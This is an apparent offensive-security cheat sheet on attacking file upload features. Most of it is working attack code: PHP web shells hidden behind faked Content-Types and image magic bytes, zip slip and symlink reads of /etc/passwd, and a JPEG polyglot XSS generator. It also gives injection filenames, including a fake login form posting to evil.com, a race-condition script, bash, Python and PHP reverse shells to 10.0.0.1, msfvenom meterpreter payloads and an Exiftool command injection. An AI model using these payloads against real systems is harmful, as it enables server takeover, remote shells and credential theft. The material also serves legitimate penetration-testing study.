# File Upload Attack

Last modified: 2023-11-11

Web

---

It is often used for gaining access to the target shell using Reverse Shell, or getting sensitive information using Remote Code Execution (RCE).

## [Check Allowed File Formats](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#check-allowed-file-formats)

First off, we need to know what file types are allowed to be uploaded in target website.  
Try to upload any formats.

```txt
.php, .php3, .php4, .php5, .phtml, .phar
.jpg, jpeg, .png, .gif
.bmp
.pdf
.js
.exe, .dll, .asp, .aspx
.py
.go
.rs
```

### [Create Blank Files for Each Format](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#create-blank-files-for-each-format)

To create a blank file for the checking purpose, execute the following command.

- **jpg, png**

```bash
# https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images
convert -size 32x32 xc:white test.jpg
convert -size 32x32 xc:white test.png
```

- **pdf**

```bash
# https://unix.stackexchange.com/questions/277892/how-do-i-create-a-blank-pdf-from-the-command-line
convert xc:none -page Letter a.pdf
```

  

## [Bypass File Extension Validation](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#bypass-file-extension-validation)

We might be able to bypass file extension validation by modifying the filename.  
For example, if we cannot upload a pure **`.php`** file extension, tweak the filename a bit as below.

```txt
exploit.php
exploit.php3
exploit.php4
exploit.php5
exploit.phtml
exploit.phar

exploit.jpg.php
exploit.jpeg.php
exploit.png.php
exploit.gif.php
exploit.pdf.php

exploit.php.
exploit.php.jpg
exploit.php.jpeg
exploit.php.png
exploit%2Ephp
exploit.p.phphp
exploit.php%00.jpg
exploit.php%0d%0a.jpg

exploit.PHP
exploit.pHp

exploit.php/
exploit.php//
exploit.php\
exploit.php#
exploit..php
```

  

## [Bypass Content-Type Validation](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#bypass-content-type-validation)

We might be able to bypass the content type validation by modifying that.  
For example, assume that we want to upload **`PHP`** file to execute **webshell** or **reverse shell**, but `PHP` files are rejected by the website.  
In this situation, we might be able to bypass the validation by modifying the **"Content-Type"** from **"application/x-php"** to other types such as **"image/jpeg"**, **"plain/text"** etc.  
Here is the example.

```html
------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg <!-- Change this. Try other types such as image/gif, plain/text, etc. -->

<?php echo system($_GET['cmd']); ?>

------abcdefghijk
```

  

## [Change Upload Location by Filename](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#change-upload-location-by-filename)

We might be able to upload our file to **unintended location** by path traversing with filename e.g. **`../example.php`** or **`..%2Fexample.php`**.

```html
------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php" <!-- Change this. -->
Content-Type: application/x-php

<?php echo system($_GET['cmd']); ?>

------abcdefghijk
```

  

## [Overwrite Server Configuration](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#overwrite-server-configuration)

We might be able to overwrite the web server configuration file such as **".htaccess"**, **".htpasswd"** by specifying the filename to the name of the config file and write desired contents of that.

```html
------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename=".htaccess" <!-- Specify the name of config file -->
Content-Type: text/plain

AddType application/x-httpd-php .abc

------abcdefghijk
```

If you have the ability to upload files, maybe try this:

```
echo "AddType application/x-httpd-php .dork" > .htaccess
```

## [Magic Bytes](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#magic-bytes)

Reference: [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

If the website checks the magic byte of the uploaded file for allowing only image files to be uploaded, we might be able to bypass this validation by adding magic bytes before the actual payload.

The **`exif_imagetype()`** PHP function is likely to be used for such validation.  
In addition, we may need to change other values such as **"Content-Type"** depending on the situation.

### [PNG](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#png)

|Hex Signature|ISO 8859-1|
|---|---|
|`89 50 4E 47 0D 0A 1A 0A`|`‰PNG␍␊␚␊`|

Payload example:

```php
‰PNG␍␊␚␊
<?php echo system($_GET['cmd']); ?>
```

### [JPG/JPEG](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#jpg%2Fjpeg)

|Hex Signature|ISO 8859-1|
|---|---|
|`FF D8 FF EE`|`ÿØÿî`|
|`FF D8 FF E0`|`ÿØÿà`|
|`FF D8 FF E0 00 10 4A 46 49 46 00 01`|`ÿØÿà␀␐JFIF␀␁`|

Payload example:

```php
ÿØÿî
<?php echo system($_GET['cmd']); ?>

// or

ÿØÿà
<?php echo system($_GET['cmd']); ?>

// or

ÿØÿà␀␐JFIF␀␁
<?php echo system($_GET['cmd']); ?>
```

### [PDF](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#pdf)

|Hex Signature|ISO 8859-1|
|---|---|
|`25 50 44 46 2D`|`%PDF-`|

Payload example:

```php
%PDF-
<?php echo system($_GET['cmd']); ?>
```

### [GIF](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#gif)

Reference: [Web Design in a Nutshell](https://docstore.mik.ua/orelly/web2/wdesign/ch19_01.htm)

- **GIF87a**: The original format for indexed color images. It uses LZW compression and has the option of being interlaced.
- **GIF89a**: Is the same as **GIF87a** but also includes transparancy and animation capabilities.

|Hex Signature|ISO 8859-1|
|---|---|
|`47 49 46 38 37 61`|`GIF87a`|
|`47 49 46 38 39 61`|`GIF89a`|

Payload example:

```php
GIF87a
<?php echo system($_GET['cmd']); ?>

// or

GIF89a
<?php echo system($_GET['cmd']); ?>
```

### [RIFF WAVE](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#riff-wave)

|Hex Signature|ISO 8859-1|
|---|---|
|`52 49 46 46 ?? ?? ?? ?? 57 41 56 45`|`RIFF????WAVE`|

Payload example:

```bash
RIFF????WAVE
<?php echo system($_GET['cmd']); ?>
```

  

## [Zip](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#zip)

If target website restricts uploads to zip files only, the website (server) may unzip uploaded files internally and displays the result of decompressed file somewhere e.g. `/upload/example.txt`.

### [Zip Slip](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#zip-slip)

Create a file containing ‘../’ in the filename, and compress this file.

```bash
echo '<?php echo system("id");?>' > '../test.php'
zip test.zip '../test.php'
```

After uploading the zip file, target website (server) will decompress this file and may store the `test.php` file into unexpected directory.

### [LFI with Symlinks](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#lfi-with-symlinks)

In local machine, create a symbolic link for a sensitive file. Then compress the symlink with `zip`.

```bash
ln -s /etc/passwd passwd.txt
zip --symlink test.zip passwd.txt
```

When we upload the zip file to target website, the website decompress the zip file and may display the file of the symbolic link (`/etc/passwd`, etc.). In short, we may be able to see the contents of the sensitive file.

  

## [JPEG Polyglot XSS](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#jpeg-polyglot-xss)

Reference: [https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a](https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a)

We may be able to inject XSS by inserting arbitrary JavaScript code into a JPEG file.  
We can generate automatically a polyglot JPEG with [imgjs_polygloter](https://github.com/s-3ntinel/imgjs_polygloter).

Below is the manual exploitation flow.

### [1. Prepare JPEG Image](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#1.-prepare-jpeg-image)

Here we create a blank JPEG image using `convert` command.

```bash
convert -size 100x100 xc:white evil.jpg

# Backup for reproduction
cp evil.jpg evil_original.jpg
```

### [2. Create XSS Payload in Hex](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#2.-create-xss-payload-in-hex)

We will insert the following JavaScript code.

```bash
*/=alert("test");/*
```

To insert it into JPEG file, we need to convert this to HEX as below:

```bash
2A 2F 3D 61 6C 65 72 74 28 22 74 65 73 74 22 29 3B 2F 2A
```

### [3. Start Hex Editor](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#3.-start-hex-editor)

Start Hex editor to modify our `evil.jpg`. We use `ghex` here but you can use your favorite HEX editor.

```bash
ghex evil.jpg
```

The original hex representation of the `evil.jpg` is as such follow:

```bash
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 ...

# Details of the Hex
# FF D8: Start of image
# FF E0: Application default header
# 00 10: The length of the JPEG header (`00 10` represents 16 bytes)
```

### [4. Insert Our JavaScript into JPEG File](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#4.-insert-our-javascript-into-jpeg-file)

Now start inserting our payload.  
First we replace `00 10` after `FF D8 FF E0` with our `2F 2A (/*)`.

```bash
FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 ...
```

By this, the length of the JPEG header is **12074 bytes** (`0x2F2A` in decimal).

Since the size of our payload is **19 bytes** as below:

```bash
python3
>>> payload = b'*/=alert("test");/*'
>>> len(payload)
19
```

We need to pad out the remaining **12042 bytes** (**12074 - 16 - 19**) with nulls.  
Below is the Python code example to generate a polyglot JPEG file, which refers to [https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py](https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py).

```python
payload = b'*/=alert("test");/*'
input_file = 'evil_original.jpg'
output_file = 'evil.jpg'

a = open(input_file, 'rb').read()

# Get the length of the header
header_size = int(a.hex()[8:12], 16)
new_header_size = int(payload.hex()[2:4]+payload.hex()[:2], 16)

# Calculate the size of nulls for padding
null_size = new_header_size - header_size - 16

# Get start and end
start = a[:40]
end = a.hex()[40:]
end = bytearray([int(end[i:i+2], 16) for i in range(0, len(end), 2)])

res = start + (null_size * b'\x00') + payload + end

with open(output_file, 'wb') as f:
	f.write(res)
```

### [5. XSS with this JPEG](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#5.-xss-with-this-jpeg)

Inject XSS to make our JPEG to execute JavaScript code. We need to set `charset` to `ISO-8859-1` for executing that.

```bash
<script charset="ISO-8859-1" src="evil.jpg">
```

  

## [Malicious Filnames](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#malicious-filnames)

### [Command Injection](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#command-injection)

```bash
# If the response comes after 10 seconds, the command injection is successful.
test.jpg;sleep 10
test.jpg;sleep+10
test.jpg;sleep 10#
test.jpg;sleep 10%00
test.jpg|sleep 10
test.jpg%0Asleep 10
;sleep 10 test.jpg

# Reverse Shell
test.jpg;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### [PHP Injection](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#php-injection)

```html
<?php echo system('id');?>.jpg
"><?php echo system('id');?>.jpg
```

### [XSS](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#xss)

```html
<script>alert(1)</script>.jpg
"><script>alert(1)</script>.jpg
```

### [SSTI](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#ssti)

```html
{{2*3}}.jpg
{2*3}.jpg
2*3.jpg
2*3}}.jpg
2*3}.jpg
${2*3}.jpg
"{{2*3}}.jpg
```

### [Truncation](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#truncation)

```bash
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxtest.jpg
test.jpgxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### [HTML Injection](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#html-injection)

Try to upload the file which includes **HTML tags** in the filename. It may affect the web page.

```html
<h1>test.jpg

<!-- `&sol;`: HTML entiry for '/' -->
"><iframe src="http:&sol;&sol;10.0.0.1">.jpg

"><img src=x onerror=alert(document.domain).jpg

"><form action="//evil.com" method="GET"><input type="text" name="username" style="opacity:0;"><input type="password" name="password" style="opacity:0;"><input type="submit" name="submit" value="submit"><!--.jpg
```

### [SQL Injection](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#sql-injection)

Try to upload the file which includes **SQL command** in the filename. It may execute **SQL Injection** when uploading or other situations.

```txt
--sleep(10).jpg
```

  

## [Race Condition Attack](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#race-condition-attack)

We might be able to bypass/execute payload using race condition.  
We can easily achieve that with **Turbo Intruder** in **Burp Suite**.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=10,)

    request_post = '''POST /avatar/upload HTTP/1.1
Host: vulnerable.com
...
...
Connection: close

------abcdefghi
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/etc/passwd');  ?>

------abcdefghijk--

'''

    request_get = '''GET /files/avatars/exploit.php HTTP/1.1
Host: vulnerable.com
...
...
Connection: close


'''

    engine.queue(request_post, gate='race1')
    for i in range(5):
        engine.queue(request_get, gate='race1')


    engine.openGate('race1')
    engine.complete(timeout=60)
    


def handleResponse(req, interesting):
    table.add(req)
```

  

## [PHP Payloads](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#php-payloads)

After finding vulnerability, we can create a payload for exploiting the website.  
Here is the example payloads of **web shell** and **reverse shell** to compromise target system.

### [Web Shell](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#web-shell)

For example, the file name is "exploit.php".

```php
// Simply showing the result of 'whoami'.
<?php echo system('whoami'); ?>

// This shows the content of "/etc/passwd".
<?php echo file_get_contents('/etc/passwd');  ?>

// We can execute arbitrary commands by passing the url parameter e.g. "/exploit.php?cmd=whoami"
<?php echo system($_GET['cmd']); ?>
```

### [Reverse Shell for Linux](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#reverse-shell-for-linux)

```sh
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
# or
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php

# Edit some variables in the payload
$ip = '<attacker-ip>'
$port = 4444
```

Or we might be able to use the following simple script.

```php
<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"); ?>
```

Then open listener for getting a shell.

```sh
nc -lvnp 4444
```

After uploading it, reload the page in which the payload uploaded e.g. `"/upload/shell.php"`.

### [Reverse Shell for Windows](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#reverse-shell-for-windows)

First create a malicious executable file using msfvenom.  
Replace **10.0.0.1** with your local ip.

```sh
# -f: Format
# -p: Payload
# -o: Output file
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o cv-username.exe
```

Next start a listener for getting the target shell.

```sh
# -x: Execute command
sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
```

After getting the shell, we will get in the meterpreter, so we need to know the meterpreter’s commands. To get a list of command, run the following in the meterpreter.

```sh
# Usage command
meterpreter> ?
```

  

## [Other Tips](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#other-tips)

  

### [Craft Upload Request](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#craft-upload-request)

If website does not display the upload page but such functionality exists on the website, we can manually create the uploading request.  
First off, we need to set **`multipart/form-data; boundary=<arbitrary_characters>`** to **Content-Type** in **HTTP headers** as below.  
Of course we need to specify the **POST** method at the top of the header.

```html
Content-Type: multipart/form-data; boundary=abcdef
```

Then we can surround **POST body (to upload file)** with this boundary as the following.

```html
--abcdef
Content-Disposition: form-data; name="profile"; filename="test.png"
Content-Type: image/jpeg

some code here...
--abcdef--
```

## [Polyglot Attack](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/#polyglot-attack)

We might be able to execute remote code by polyglotting the original plain image file.  
At first, create a blank image file as below, but this step may be not required if you already have some image file.

```sh
convert -size 32x32 xc:white test.jpg
```

Then insert **OS command** with **exiftool**.

```sh
exiftool -Comment="<?php system('ls'); ?>" example.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.png
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
```

  
  

## [Command Injection (version < v12.38)](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/#command-injection-(version-%3C-v12.38))

On Exiftool version lower than **12.38**, we can inject **OS command** in the filename when uploading.

```bash
# Ping
filename="touch test; ping -c 1 10.0.0.1 |"

# Reverse shell
filename="touch test; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 |"
filename="touch test; bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\" |"
filename="touch test; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\", 1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' |"
```